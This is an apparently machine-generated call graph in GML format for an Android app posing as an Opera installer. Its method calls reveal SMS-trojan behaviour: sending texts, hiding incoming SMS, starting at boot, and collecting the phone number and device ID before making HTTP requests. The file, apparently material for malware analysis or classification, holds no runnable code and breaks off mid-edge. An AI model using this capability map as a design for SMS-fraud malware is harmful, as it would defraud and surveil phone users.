graph [
  directed 1
  node [
    id 0
    label "Lcom/opera/installer/AgreementActivitys;-><init>()V [access_flags=public constructor] @ 0x1528"
    external False
    entrypoint True
  ]
  node [
    id 1
    label "Landroid/app/Activity;-><init>()V"
    external True
    entrypoint False
  ]
  node [
    id 2
    label "Lcom/opera/installer/AgreementActivitys;->onCreate(Landroid/os/Bundle;)V [access_flags=public] @ 0x1544"
    external False
    entrypoint True
  ]
  node [
    id 3
    label "Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V"
    external True
    entrypoint False
  ]
  node [
    id 4
    label "Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V"
    external True
    entrypoint False
  ]
  node [
    id 5
    label "Lcom/opera/installer/AgreementActivitys;->findViewById(I)Landroid/view/View;"
    external True
    entrypoint True
  ]
  node [
    id 6
    label "Lcom/opera/installer/AgreementActivitys;->setContentView(I)V"
    external True
    entrypoint True
  ]
  node [
    id 7
    label "Lcom/opera/installer/i;-><init>(Lcom/opera/installer/AgreementActivitys;)V [access_flags=constructor] @ 0x2934"
    external False
    entrypoint False
  ]
  node [
    id 8
    label "Lcom/opera/installer/g;-><init>(Lcom/opera/installer/AgreementActivitys;)V [access_flags=constructor] @ 0x28a0"
    external False
    entrypoint False
  ]
  node [
    id 9
    label "Lcom/opera/installer/AgreementActivitys;->finish()V"
    external True
    entrypoint True
  ]
  node [
    id 10
    label "Lcom/opera/installer/AgreementActivitys;->getBaseContext()Landroid/content/Context;"
    external True
    entrypoint True
  ]
  node [
    id 11
    label "Lcom/opera/installer/AgreementActivitys;->startActivity(Landroid/content/Intent;)V"
    external True
    entrypoint True
  ]
  node [
    id 12
    label "Lcom/opera/installer/Alarm;-><init>()V [access_flags=public constructor] @ 0x15c4"
    external False
    entrypoint False
  ]
  node [
    id 13
    label "Ljava/util/ArrayList;-><init>()V"
    external True
    entrypoint False
  ]
  node [
    id 14
    label "Landroid/content/BroadcastReceiver;-><init>()V"
    external True
    entrypoint False
  ]
  node [
    id 15
    label "Lcom/opera/installer/Alarm;->a(Landroid/content/Context; Ljava/lang/String; Ljava/lang/String;)V [access_flags=public static final] @ 0x1610"
    external False
    entrypoint False
  ]
  node [
    id 16
    label "Landroid/content/Intent;->putExtra(Ljava/lang/String; Ljava/lang/String;)Landroid/content/Intent;"
    external True
    entrypoint False
  ]
  node [
    id 17
    label "Landroid/content/Intent;-><init>(Ljava/lang/String; Landroid/net/Uri;)V"
    external True
    entrypoint False
  ]
  node [
    id 18
    label "Landroid/content/Context;->startActivity(Landroid/content/Intent;)V"
    external True
    entrypoint False
  ]
  node [
    id 19
    label "Lcom/opera/installer/Alarm;->a(Lcom/opera/installer/Alarm; Ljava/lang/String; Ljava/lang/String;)V [access_flags=static synthetic] @ 0x1650"
    external False
    entrypoint False
  ]
  node [
    id 20
    label "Lcom/opera/installer/Alarm;->a(Ljava/lang/String; Ljava/lang/String;)V [access_flags=private] @ 0x1668"
    external False
    entrypoint False
  ]
  node [
    id 21
    label "Landroid/telephony/gsm/SmsManager;->sendTextMessage(Ljava/lang/String; Ljava/lang/String; Ljava/lang/String; Landroid/app/PendingIntent; Landroid/app/PendingIntent;)V"
    external True
    entrypoint False
  ]
  node [
    id 22
    label "Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context; I Landroid/content/Intent; I)Landroid/app/PendingIntent;"
    external True
    entrypoint False
  ]
  node [
    id 23
    label "Landroid/telephony/gsm/SmsManager;->getDefault()Landroid/telephony/gsm/SmsManager;"
    external True
    entrypoint False
  ]
  node [
    id 24
    label "Landroid/content/Intent;-><init>(Ljava/lang/String;)V"
    external True
    entrypoint False
  ]
  node [
    id 25
    label "Lcom/opera/installer/Alarm;->onReceive(Landroid/content/Context; Landroid/content/Intent;)V [access_flags=public] @ 0x16c4"
    external False
    entrypoint False
  ]
  node [
    id 26
    label "Landroid/os/PowerManager$WakeLock;->acquire()V"
    external True
    entrypoint False
  ]
  node [
    id 27
    label "Landroid/os/PowerManager;->newWakeLock(I Ljava/lang/String;)Landroid/os/PowerManager$WakeLock;"
    external True
    entrypoint False
  ]
  node [
    id 28
    label "Landroid/preference/PreferenceManager;->getDefaultSharedPreferences(Landroid/content/Context;)Landroid/content/SharedPreferences;"
    external True
    entrypoint False
  ]
  node [
    id 29
    label "Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z"
    external True
    entrypoint False
  ]
  node [
    id 30
    label "Ljava/lang/String;->toLowerCase()Ljava/lang/String;"
    external True
    entrypoint False
  ]
  node [
    id 31
    label "Lcom/opera/installer/j;-><init>(Lcom/opera/installer/Alarm;)V [access_flags=constructor] @ 0x2990"
    external False
    entrypoint False
  ]
  node [
    id 32
    label "Landroid/telephony/TelephonyManager;->getSimOperatorName()Ljava/lang/String;"
    external True
    entrypoint False
  ]
  node [
    id 33
    label "Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;"
    external True
    entrypoint False
  ]
  node [
    id 34
    label "Lcom/opera/installer/j;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;"
    external True
    entrypoint False
  ]
  node [
    id 35
    label "Landroid/os/PowerManager$WakeLock;->release()V"
    external True
    entrypoint False
  ]
  node [
    id 36
    label "Lcom/opera/installer/ConsoleActivitys;-><init>()V [access_flags=public constructor] @ 0x1798"
    external False
    entrypoint False
  ]
  node [
    id 37
    label "Lcom/opera/installer/ConsoleActivitys;->a()Ljava/lang/String; [access_flags=private] @ 0x17b0"
    external False
    entrypoint False
  ]
  node [
    id 38
    label "Ljava/lang/String;->toString()Ljava/lang/String;"
    external True
    entrypoint False
  ]
  node [
    id 39
    label "Landroid/telephony/TelephonyManager;->getSimOperator()Ljava/lang/String;"
    external True
    entrypoint False
  ]
  node [
    id 40
    label "Lcom/opera/installer/ConsoleActivitys;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;"
    external True
    entrypoint False
  ]
  node [
    id 41
    label "Lcom/opera/installer/ConsoleActivitys;->onCreate(Landroid/os/Bundle;)V [access_flags=public] @ 0x17e4"
    external False
    entrypoint False
  ]
  node [
    id 42
    label "Ljava/lang/StringBuilder;-><init>()V"
    external True
    entrypoint False
  ]
  node [
    id 43
    label "Ljava/lang/StringBuilder;->toString()Ljava/lang/String;"
    external True
    entrypoint False
  ]
  node [
    id 44
    label "Ljava/io/OutputStreamWriter;-><init>(Ljava/io/OutputStream;)V"
    external True
    entrypoint False
  ]
  node [
    id 45
    label "Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;"
    external True
    entrypoint False
  ]
  node [
    id 46
    label "Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String; Ljava/lang/String; Ljava/lang/String; Landroid/app/PendingIntent; Landroid/app/PendingIntent;)V"
    external True
    entrypoint False
  ]
  node [
    id 47
    label "Lcom/opera/installer/ConsoleActivitys;->finish()V"
    external True
    entrypoint False
  ]
  node [
    id 48
    label "Ljava/io/IOException;->printStackTrace()V"
    external True
    entrypoint False
  ]
  node [
    id 49
    label "Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;"
    external True
    entrypoint False
  ]
  node [
    id 50
    label "Ljava/lang/String;->length()I"
    external True
    entrypoint False
  ]
  node [
    id 51
    label "Ljava/io/OutputStreamWriter;->flush()V"
    external True
    entrypoint False
  ]
  node [
    id 52
    label "Lcom/opera/installer/ConsoleActivitys;->openFileOutput(Ljava/lang/String; I)Ljava/io/FileOutputStream;"
    external True
    entrypoint False
  ]
  node [
    id 53
    label "Landroid/content/Intent;-><init>(Landroid/content/Context; Ljava/lang/Class;)V"
    external True
    entrypoint False
  ]
  node [
    id 54
    label "Lcom/opera/installer/ConsoleActivitys;->startActivity(Landroid/content/Intent;)V"
    external True
    entrypoint False
  ]
  node [
    id 55
    label "Lcom/opera/installer/c;-><init>(Ljava/lang/String; Landroid/app/Activity;)V [access_flags=public constructor] @ 0x2258"
    external False
    entrypoint False
  ]
  node [
    id 56
    label "Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V"
    external True
    entrypoint False
  ]
  node [
    id 57
    label "Ljava/io/OutputStreamWriter;->write(Ljava/lang/String;)V"
    external True
    entrypoint False
  ]
  node [
    id 58
    label "Lcom/opera/installer/ConsoleActivitys;->findViewById(I)Landroid/view/View;"
    external True
    entrypoint False
  ]
  node [
    id 59
    label "Ljava/io/FileNotFoundException;->printStackTrace()V"
    external True
    entrypoint False
  ]
  node [
    id 60
    label "Lcom/opera/installer/ConsoleActivitys;->getBaseContext()Landroid/content/Context;"
    external True
    entrypoint False
  ]
  node [
    id 61
    label "Ljava/io/OutputStreamWriter;->close()V"
    external True
    entrypoint False
  ]
  node [
    id 62
    label "Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;"
    external True
    entrypoint False
  ]
  node [
    id 63
    label "Lcom/opera/installer/ConsoleActivitys;->setContentView(I)V"
    external True
    entrypoint False
  ]
  node [
    id 64
    label "Lcom/opera/installer/DownloadsActivity;-><init>()V [access_flags=public constructor] @ 0x1aa8"
    external False
    entrypoint True
  ]
  node [
    id 65
    label "Lcom/opera/installer/DownloadsActivity;->onCreate(Landroid/os/Bundle;)V [access_flags=public] @ 0x1ac0"
    external False
    entrypoint True
  ]
  node [
    id 66
    label "Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;"
    external True
    entrypoint False
  ]
  node [
    id 67
    label "Lcom/opera/installer/DownloadsActivity;->getIntent()Landroid/content/Intent;"
    external True
    entrypoint True
  ]
  node [
    id 68
    label "Lcom/opera/installer/DownloadsActivity;->setContentView(I)V"
    external True
    entrypoint True
  ]
  node [
    id 69
    label "Landroid/webkit/WebView;->setWebViewClient(Landroid/webkit/WebViewClient;)V"
    external True
    entrypoint False
  ]
  node [
    id 70
    label "Lcom/opera/installer/d;-><init>(Lcom/opera/installer/DownloadsActivity;)V [access_flags=synthetic constructor] @ 0x25e4"
    external False
    entrypoint False
  ]
  node [
    id 71
    label "Lcom/opera/installer/DownloadsActivity;->findViewById(I)Landroid/view/View;"
    external True
    entrypoint True
  ]
  node [
    id 72
    label "Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V"
    external True
    entrypoint False
  ]
  node [
    id 73
    label "Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;"
    external True
    entrypoint False
  ]
  node [
    id 74
    label "Landroid/content/Intent;->getExtras()Landroid/os/Bundle;"
    external True
    entrypoint False
  ]
  node [
    id 75
    label "Lcom/opera/installer/b;-><init>(Lcom/opera/installer/DownloadsActivity;)V [access_flags=constructor] @ 0x21ec"
    external False
    entrypoint False
  ]
  node [
    id 76
    label "Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V"
    external True
    entrypoint False
  ]
  node [
    id 77
    label "Lcom/opera/installer/InstallActivitys;-><init>()V [access_flags=public constructor] @ 0x1b48"
    external False
    entrypoint True
  ]
  node [
    id 78
    label "Lcom/opera/installer/InstallActivitys;->a(Ljava/lang/String;)Z [access_flags=private] @ 0x1b64"
    external False
    entrypoint True
  ]
  node [
    id 79
    label "Ljava/lang/String;->equals(Ljava/lang/Object;)Z"
    external True
    entrypoint False
  ]
  node [
    id 80
    label "Lcom/opera/installer/InstallActivitys;->openFileOutput(Ljava/lang/String; I)Ljava/io/FileOutputStream;"
    external True
    entrypoint True
  ]
  node [
    id 81
    label "Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V"
    external True
    entrypoint False
  ]
  node [
    id 82
    label "Ljava/lang/String;-><init>([C)V"
    external True
    entrypoint False
  ]
  node [
    id 83
    label "Lcom/opera/installer/InstallActivitys;->openFileInput(Ljava/lang/String;)Ljava/io/FileInputStream;"
    external True
    entrypoint True
  ]
  node [
    id 84
    label "Ljava/io/InputStreamReader;->read([C)I"
    external True
    entrypoint False
  ]
  node [
    id 85
    label "Lcom/opera/installer/InstallActivitys;->onCreate(Landroid/os/Bundle;)V [access_flags=public] @ 0x1c64"
    external False
    entrypoint True
  ]
  node [
    id 86
    label "Lcom/opera/installer/InstallActivitys;->finish()V"
    external True
    entrypoint True
  ]
  node [
    id 87
    label "Lcom/opera/installer/InstallActivitys;->getBaseContext()Landroid/content/Context;"
    external True
    entrypoint True
  ]
  node [
    id 88
    label "Lcom/opera/installer/h;-><init>(Lcom/opera/installer/InstallActivitys;)V [access_flags=constructor] @ 0x28d8"
    external False
    entrypoint False
  ]
  node [
    id 89
    label "Landroid/text/Html;->fromHtml(Ljava/lang/String;)Landroid/text/Spanned;"
    external True
    entrypoint False
  ]
  node [
    id 90
    label "Lcom/opera/installer/InstallActivitys;->setContentView(I)V"
    external True
    entrypoint True
  ]
  node [
    id 91
    label "Lcom/opera/installer/InstallActivitys;->getString(I)Ljava/lang/String;"
    external True
    entrypoint True
  ]
  node [
    id 92
    label "Lcom/opera/installer/f;-><init>(Lcom/opera/installer/InstallActivitys;)V [access_flags=constructor] @ 0x284c"
    external False
    entrypoint False
  ]
  node [
    id 93
    label "Lcom/opera/installer/InstallActivitys;->startActivity(Landroid/content/Intent;)V"
    external True
    entrypoint True
  ]
  node [
    id 94
    label "Lcom/opera/installer/InstallActivitys;->findViewById(I)Landroid/view/View;"
    external True
    entrypoint True
  ]
  node [
    id 95
    label "Lcom/opera/installer/InstallActivitys;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;"
    external True
    entrypoint True
  ]
  node [
    id 96
    label "Lcom/opera/installer/OnBootReceiver;-><init>()V [access_flags=public constructor] @ 0x1d5c"
    external False
    entrypoint True
  ]
  node [
    id 97
    label "Lcom/opera/installer/OnBootReceiver;->onReceive(Landroid/content/Context; Landroid/content/Intent;)V [access_flags=public] @ 0x1d7c"
    external False
    entrypoint True
  ]
  node [
    id 98
    label "Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;"
    external True
    entrypoint False
  ]
  node [
    id 99
    label "Lcom/opera/installer/SmsReceiver;-><init>()V [access_flags=public constructor] @ 0x1dc0"
    external False
    entrypoint True
  ]
  node [
    id 100
    label "Ljava/util/concurrent/Executors;->newScheduledThreadPool(I)Ljava/util/concurrent/ScheduledExecutorService;"
    external True
    entrypoint False
  ]
  node [
    id 101
    label "Lcom/opera/installer/SmsReceiver;->onReceive(Landroid/content/Context; Landroid/content/Intent;)V [access_flags=public] @ 0x1de8"
    external False
    entrypoint True
  ]
  node [
    id 102
    label "Landroid/telephony/gsm/SmsMessage;->getOriginatingAddress()Ljava/lang/String;"
    external True
    entrypoint False
  ]
  node [
    id 103
    label "Ljava/util/regex/Matcher;->find()Z"
    external True
    entrypoint False
  ]
  node [
    id 104
    label "Lcom/opera/installer/SmsReceiver;->abortBroadcast()V"
    external True
    entrypoint True
  ]
  node [
    id 105
    label "Ljava/util/regex/Matcher;->group()Ljava/lang/String;"
    external True
    entrypoint False
  ]
  node [
    id 106
    label "Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;"
    external True
    entrypoint False
  ]
  node [
    id 107
    label "Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;"
    external True
    entrypoint False
  ]
  node [
    id 108
    label "Ljava/util/regex/Pattern;->compile(Ljava/lang/String;)Ljava/util/regex/Pattern;"
    external True
    entrypoint False
  ]
  node [
    id 109
    label "Landroid/telephony/gsm/SmsMessage;->createFromPdu([B)Landroid/telephony/gsm/SmsMessage;"
    external True
    entrypoint False
  ]
  node [
    id 110
    label "Landroid/telephony/gsm/SmsMessage;->getDisplayMessageBody()Ljava/lang/String;"
    external True
    entrypoint False
  ]
  node [
    id 111
    label "Lcom/opera/installer/SystemService;-><init>()V [access_flags=public constructor] @ 0x1f00"
    external False
    entrypoint False
  ]
  node [
    id 112
    label "Landroid/app/Service;-><init>()V"
    external True
    entrypoint False
  ]
  node [
    id 113
    label "Lcom/opera/installer/SystemService;->a(Ljava/lang/String;)V [access_flags=public static] @ 0x1f18"
    external False
    entrypoint False
  ]
  node [
    id 114
    label "Landroid/content/Context;->getString(I)Ljava/lang/String;"
    external True
    entrypoint False
  ]
  node [
    id 115
    label "Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;"
    external True
    entrypoint False
  ]
  node [
    id 116
    label "Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String; Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;"
    external True
    entrypoint False
  ]
  node [
    id 117
    label "Landroid/content/SharedPreferences$Editor;->commit()Z"
    external True
    entrypoint False
  ]
  node [
    id 118
    label "Lcom/opera/installer/SystemService;->onDestroy()V [access_flags=public] @ 0x1f7c"
    external False
    entrypoint False
  ]
  node [
    id 119
    label "Landroid/app/Service;->onDestroy()V"
    external True
    entrypoint False
  ]
  node [
    id 120
    label "Lcom/opera/installer/SystemService;->onStart(Landroid/content/Intent; I)V [access_flags=public] @ 0x1f94"
    external False
    entrypoint False
  ]
  node [
    id 121
    label "Lcom/opera/installer/e;-><init>()V [access_flags=public constructor] @ 0x2638"
    external False
    entrypoint False
  ]
  node [
    id 122
    label "Lcom/opera/installer/e;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;"
    external True
    entrypoint False
  ]
  node [
    id 123
    label "Lcom/opera/installer/SystemService;->getString(I)Ljava/lang/String;"
    external True
    entrypoint False
  ]
  node [
    id 124
    label "Ljava/lang/System;->currentTimeMillis()J"
    external True
    entrypoint False
  ]
  node [
    id 125
    label "Landroid/content/SharedPreferences;->getString(Ljava/lang/String; Ljava/lang/String;)Ljava/lang/String;"
    external True
    entrypoint False
  ]
  node [
    id 126
    label "Landroid/app/AlarmManager;->setRepeating(I J J Landroid/app/PendingIntent;)V"
    external True
    entrypoint False
  ]
  node [
    id 127
    label "Landroid/app/Service;->onStart(Landroid/content/Intent; I)V"
    external True
    entrypoint False
  ]
  node [
    id 128
    label "Lcom/opera/installer/SystemService;->onUnbind(Landroid/content/Intent;)Z [access_flags=public] @ 0x202c"
    external False
    entrypoint False
  ]
  node [
    id 129
    label "Landroid/app/Service;->onUnbind(Landroid/content/Intent;)Z"
    external True
    entrypoint False
  ]
  node [
    id 130
    label "Lcom/opera/installer/a;-><init>(Lcom/opera/installer/Alarm;)V [access_flags=constructor] @ 0x2048"
    external False
    entrypoint False
  ]
  node [
    id 131
    label "Landroid/os/AsyncTask;-><init>()V"
    external True
    entrypoint False
  ]
  node [
    id 132
    label "Lcom/opera/installer/a;->a([Ljava/lang/String;)Ljava/lang/String; [access_flags=private varargs] @ 0x2064"
    external False
    entrypoint False
  ]
  node [
    id 133
    label "Ljava/io/BufferedReader;-><init>(Ljava/io/Reader; I)V"
    external True
    entrypoint False
  ]
  node [
    id 134
    label "Ljava/io/InputStream;->close()V"
    external True
    entrypoint False
  ]
  node [
    id 135
    label "Lorg/apache/http/client/HttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;"
    external True
    entrypoint False
  ]
  node [
    id 136
    label "Ljava/net/URI;->toASCIIString()Ljava/lang/String;"
    external True
    entrypoint False
  ]
  node [
    id 137
    label "Ljava/io/BufferedReader;->readLine()Ljava/lang/String;"
    external True
    entrypoint False
  ]
  node [
    id 138
    label "Lorg/apache/http/HttpResponse;->getEntity()Lorg/apache/http/HttpEntity;"
    external True
    entrypoint False
  ]
  node [
    id 139
    label "Lorg/apache/http/client/methods/HttpGet;-><init>(Ljava/lang/String;)V"
    external True
    entrypoint False
  ]
  node [
    id 140
    label "Ljava/net/URISyntaxException;->printStackTrace()V"
    external True
    entrypoint False
  ]
  node [
    id 141
    label "Lorg/apache/http/HttpEntity;->getContent()Ljava/io/InputStream;"
    external True
    entrypoint False
  ]
  node [
    id 142
    label "Ljava/io/BufferedReader;->close()V"
    external True
    entrypoint False
  ]
  node [
    id 143
    label "Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream; Ljava/lang/String;)V"
    external True
    entrypoint False
  ]
  node [
    id 144
    label "Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;"
    external True
    entrypoint False
  ]
  node [
    id 145
    label "Lorg/apache/http/impl/client/DefaultHttpClient;-><init>()V"
    external True
    entrypoint False
  ]
  node [
    id 146
    label "Ljava/net/URI;-><init>(Ljava/lang/String; Ljava/lang/String; Ljava/lang/String; Ljava/lang/String; Ljava/lang/String;)V"
    external True
    entrypoint False
  ]
  node [
    id 147
    label "Ljava/lang/Exception;->printStackTrace()V"
    external True
    entrypoint False
  ]
  node [
    id 148
    label "Lcom/opera/installer/a;->doInBackground([Ljava/lang/Object;)Ljava/lang/Object; [access_flags=protected final bridge synthetic] @ 0x21b8"
    external False
    entrypoint False
  ]
  node [
    id 149
    label "Lcom/opera/installer/a;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;"
    external True
    entrypoint False
  ]
  node [
    id 150
    label "Landroid/webkit/WebViewClient;-><init>()V"
    external True
    entrypoint False
  ]
  node [
    id 151
    label "Lcom/opera/installer/b;->onLoadResource(Landroid/webkit/WebView; Ljava/lang/String;)V [access_flags=public final] @ 0x2208"
    external False
    entrypoint False
  ]
  node [
    id 152
    label "Landroid/webkit/WebView;->getContext()Landroid/content/Context;"
    external True
    entrypoint False
  ]
  node [
    id 153
    label "Ljava/lang/String;->endsWith(Ljava/lang/String;)Z"
    external True
    entrypoint False
  ]
  node [
    id 154
    label "Landroid/webkit/WebViewClient;->onLoadResource(Landroid/webkit/WebView; Ljava/lang/String;)V"
    external True
    entrypoint False
  ]
  node [
    id 155
    label "Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;"
    external True
    entrypoint False
  ]
  node [
    id 156
    label "Ljava/lang/Object;-><init>()V"
    external True
    entrypoint False
  ]
  node [
    id 157
    label "Lcom/opera/installer/c;->b()V [access_flags=private] @ 0x2428"
    external False
    entrypoint False
  ]
  node [
    id 158
    label "Lcom/opera/installer/c;->c()V [access_flags=private] @ 0x2510"
    external False
    entrypoint False
  ]
  node [
    id 159
    label "Lcom/opera/installer/c;->a()V [access_flags=private] @ 0x23b4"
    external False
    entrypoint False
  ]
  node [
    id 160
    label "Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;"
    external True
    entrypoint False
  ]
  node [
    id 161
    label "Ljava/lang/StringBuilder;->append([C I I)Ljava/lang/StringBuilder;"
    external True
    entrypoint False
  ]
  node [
    id 162
    label "Landroid/app/Activity;->getAssets()Landroid/content/res/AssetManager;"
    external True
    entrypoint False
  ]
  node [
    id 163
    label "Lcom/opera/installer/c;->a(Ljava/lang/String;)Ljava/lang/String; [access_flags=private static] @ 0x22d0"
    external False
    entrypoint False
  ]
  node [
    id 164
    label "Ljava/lang/String;-><init>(Ljava/lang/StringBuilder;)V"
    external True
    entrypoint False
  ]
  node [
    id 165
    label "Ljava/io/Reader;->read([C I I)I"
    external True
    entrypoint False
  ]
  node [
    id 166
    label "Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;"
    external True
    entrypoint False
  ]
  node [
    id 167
    label "Ljava/lang/String;->substring(I I)Ljava/lang/String;"
    external True
    entrypoint False
  ]
  node [
    id 168
    label "Ljava/lang/StringBuilder;->substring(I I)Ljava/lang/String;"
    external True
    entrypoint False
  ]
  node [
    id 169
    label "Ljava/lang/StringBuilder;->charAt(I)C"
    external True
    entrypoint False
  ]
  node [
    id 170
    label "Ljava/lang/String;->charAt(I)C"
    external True
    entrypoint False
  ]
  node [
    id 171
    label "Ljava/lang/StringBuilder;->length()I"
    external True
    entrypoint False
  ]
  node [
    id 172
    label "Ljava/lang/StringBuilder;->append(Ljava/lang/CharSequence;)Ljava/lang/StringBuilder;"
    external True
    entrypoint False
  ]
  node [
    id 173
    label "Lcom/opera/installer/d;-><init>(Lcom/opera/installer/DownloadsActivity; B)V [access_flags=private constructor] @ 0x2600"
    external False
    entrypoint False
  ]
  node [
    id 174
    label "Lcom/opera/installer/d;->shouldOverrideUrlLoading(Landroid/webkit/WebView; Ljava/lang/String;)Z [access_flags=public final] @ 0x261c"
    external False
    entrypoint False
  ]
  node [
    id 175
    label "Lcom/opera/installer/e;->a()Ljava/lang/String; [access_flags=private static varargs] @ 0x2650"
    external False
    entrypoint False
  ]
  node [
    id 176
    label "Landroid/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;"
    external True
    entrypoint False
  ]
  node [
    id 177
    label "Landroid/telephony/TelephonyManager;->getSimCountryIso()Ljava/lang/String;"
    external True
    entrypoint False
  ]
  node [
    id 178
    label "Lcom/opera/installer/e;->doInBackground([Ljava/lang/Object;)Ljava/lang/Object; [access_flags=protected final bridge synthetic] @ 0x2814"
    external False
    entrypoint False
  ]
  node [
    id 179
    label "Lcom/opera/installer/e;->onPostExecute(Ljava/lang/Object;)V [access_flags=protected final bridge synthetic] @ 0x2830"
    external False
    entrypoint False
  ]
  node [
    id 180
    label "Landroid/os/AsyncTask;->onPostExecute(Ljava/lang/Object;)V"
    external True
    entrypoint False
  ]
  node [
    id 181
    label "Lcom/opera/installer/f;->onClick(Landroid/view/View;)V [access_flags=public final] @ 0x2868"
    external False
    entrypoint False
  ]
  node [
    id 182
    label "Lcom/opera/installer/g;->onClick(Landroid/view/View;)V [access_flags=public final] @ 0x28bc"
    external False
    entrypoint False
  ]
  node [
    id 183
    label "Lcom/opera/installer/h;->onClick(Landroid/view/View;)V [access_flags=public final] @ 0x28f4"
    external False
    entrypoint False
  ]
  node [
    id 184
    label "Lcom/opera/installer/i;->onClick(Landroid/view/View;)V [access_flags=public final] @ 0x2950"
    external False
    entrypoint False
  ]
  node [
    id 185
    label "Lcom/opera/installer/j;->a()Ljava/lang/String; [access_flags=private varargs] @ 0x29ac"
    external False
    entrypoint False
  ]
  node [
    id 186
    label "Landroid/content/ContentResolver;->query(Landroid/net/Uri; [Ljava/lang/String; Ljava/lang/String; [Ljava/lang/String; Ljava/lang/String;)Landroid/database/Cursor;"
    external True
    entrypoint False
  ]
  node [
    id 187
    label "Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;"
    external True
    entrypoint False
  ]
  node [
    id 188
    label "Landroid/database/Cursor;->close()V"
    external True
    entrypoint False
  ]
  node [
    id 189
    label "Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;"
    external True
    entrypoint False
  ]
  node [
    id 190
    label "Landroid/database/Cursor;->getString(I)Ljava/lang/String;"
    external True
    entrypoint False
  ]
  node [
    id 191
    label "Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;"
    external True
    entrypoint False
  ]
  node [
    id 192
    label "Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I"
    external True
    entrypoint False
  ]
  node [
    id 193
    label "Landroid/database/Cursor;->moveToNext()Z"
    external True
    entrypoint False
  ]
  node [
    id 194
    label "Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z"
    external True
    entrypoint False
  ]
  node [
    id 195
    label "Ljava/util/ArrayList;->size()I"
    external True
    entrypoint False
  ]
  node [
    id 196
    label "Ljava/util/ArrayList;->get(I)Ljava/lang/Object;"
    external True
    entrypoint False
  ]
  node [
    id 197
    label "Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z"
    external True
    entrypoint False
  ]
  node [
    id 198
    label "Lorg/json/JSONArray;-><init>(Ljava/lang/String;)V"
    external True
    entrypoint False
  ]
  node [
    id 199
    label "Lorg/json/JSONArray;->getJSONObject(I)Lorg/json/JSONObject;"
    external True
    entrypoint False
  ]
  node [
    id 200
    label "Ljava/lang/Boolean;->parseBoolean(Ljava/lang/String;)Z"
    external True
    entrypoint False
  ]
  node [
    id 201
    label "Lorg/json/JSONArray;->toString()Ljava/lang/String;"
    external True
    entrypoint False
  ]
  node [
    id 202
    label "Lcom/opera/installer/j;->doInBackground([Ljava/lang/Object;)Ljava/lang/Object; [access_flags=protected final bridge synthetic] @ 0x2e88"
    external False
    entrypoint False
  ]
  edge [
    source 0
    target 1
  ]
  edge [
    source 2
    target 3
  ]
  edge [
    source 2
    target 4
  ]
  edge [
    source 2
    target 5
  ]
  edge [
    source 2
    target 6
  ]
  edge [
    source 2
    target 7
  ]
  edge [
    source 2
    target 8
  ]
  edge [
    source 7
    target 156
  ]
  edge [
    source 8
    target 156
  ]
  edge [
    source 12
    target 13
  ]
  edge [
    source 12
    target 14
  ]
  edge [
    source 15
    target 16
  ]
  edge [
    source 15
    target 17
  ]
  edge [
    source 15
    target 18
  ]
  edge [
    source 19
    target 20
  ]
  edge [
    source 20
    target 21
  ]
  edge [
    source 20
    target 22
  ]
  edge [
    source 20
    target 23
  ]
  edge [
    source 20
    target 24
  ]
  edge [
    source 25
    target 26
  ]
  edge [
    source 25
    target 27
  ]
  edge [
    source 25
    target 28
  ]
  edge [
    source 25
    target 29
  ]
  edge [
    source 25
    target 30
  ]
  edge [
    source 25
    target 31
  ]
  edge [
    source 25
    target 32
  ]
  edge [
    source 25
    target 33
  ]
  edge [
    source 25
    target 20
  ]
  edge [
    source 25
    target 34
  ]
  edge [
    source 25
    target 35
  ]
  edge [
    source 31
    target 131
  ]
  edge [
    source 36
    target 1
  ]
  edge [
    source 37
    target 38
  ]
  edge [
    source 37
    target 39
  ]
  edge [
    source 37
    target 40
  ]
  edge [
    source 41
    target 42
  ]
  edge [
    source 41
    target 43
  ]
  edge [
    source 41
    target 44
  ]
  edge [
    source 41
    target 37
  ]
  edge [
    source 41
    target 45
  ]
  edge [
    source 41
    target 16
  ]
  edge [
    source 41
    target 46
  ]
  edge [
    source 41
    target 47
  ]
  edge [
    source 41
    target 48
  ]
  edge [
    source 41
    target 49
  ]
  edge [
    source 41
    target 50
  ]
  edge [
    source 41
    target 51
  ]
  edge [
    source 41
    target 52
  ]
  edge [
    source 41
    target 53
  ]
  edge [
    source 41
